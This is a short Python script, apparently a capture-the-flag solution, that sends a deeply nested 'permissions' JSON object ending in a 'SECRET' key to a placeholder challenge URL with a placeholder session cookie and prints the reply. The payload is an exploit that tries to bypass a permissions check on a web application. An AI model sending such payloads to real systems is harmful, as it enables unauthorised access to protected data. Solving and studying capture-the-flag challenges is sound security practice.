import requests

url = "your_chall_url"

cookies = {
    "session": "your_user_session"
}

payload = {
  "permissions": {
    "a": {
      "b": {
        "c": {
          "d": {
            "e": {
              "f": {
                "g": {
                  "h": {
                    "i": {
                      "j": {
                        "k": {
                          "l": {
                            "m": {
                              "n": {
                                "o": {
                                  "p": {
                                    "q": {
                                      "r": {
                                        "s": {
                                          "t": {
                                            "u": {
                                              "v": {
                                                "w": {
                                                  "x": {
                                                    "y": {
                                                      "SECRET": "superidol_value"
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

r = requests.post(url, json=payload, cookies=cookies)
print(r.text)
